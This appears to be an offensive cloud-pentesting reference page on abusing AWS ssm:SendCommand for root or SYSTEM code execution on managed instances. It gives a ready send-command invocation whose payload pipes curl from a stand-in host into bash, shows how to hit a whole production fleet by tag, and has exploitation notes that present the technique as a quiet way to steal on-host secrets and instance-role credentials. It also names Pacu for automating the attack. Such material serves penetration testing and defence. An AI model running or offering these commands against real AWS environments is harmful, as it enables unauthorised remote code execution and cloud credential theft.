---
title: "Run command: ssm:SendCommand code execution on managed instances"
description: "ssm:SendCommand to execute commands as root or SYSTEM on managed instances without touching the metadata service."
keywords:
  - SSM
  - SendCommand
  - run command
  - command execution
  - managed instance
---

# Run command

`ssm:SendCommand` runs a shell command on any SSM-managed instance through the `AWS-RunShellScript` (Linux) or `AWS-RunPowerShellScript` (Windows) document. The command executes as the SSM agent, which is root or SYSTEM, so a single API call with no network path to the host gives full code execution.

## Executing a command

```bash
aws ssm send-command \
  --document-name AWS-RunShellScript \
  --targets Key=InstanceIds,Values=<id1>,<id2> \
  --parameters 'commands=["id","curl -s https://you.example/x | bash"]'

# fetch the output
aws ssm list-command-invocations --command-id <cid> --details
```

Target many hosts at once with a tag filter: `--targets Key=tag:Env,Values=prod`.

## Exploitation notes

- Execution as root yields both on-host secrets and the instance profile role from IMDS, so this is a credential-theft path as much as an execution one.
- It needs no inbound access or key, only the API permission and an agent-managed instance, which makes it quiet relative to SSH.
- `ssm:SendCommand` is a known privilege-escalation lever when the instance role is more privileged than the caller.

## Tools

- **AWS CLI** (`ssm send-command`, `list-command-invocations`): run and read.
- **Pacu** (`ssm__send_command`): automate across discovered instances.

## References

- [HackTricks Cloud: ssm:SendCommand](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/index.html)
- [AWS: Run Command](https://docs.aws.amazon.com/systems-manager/latest/userguide/run-command.html)
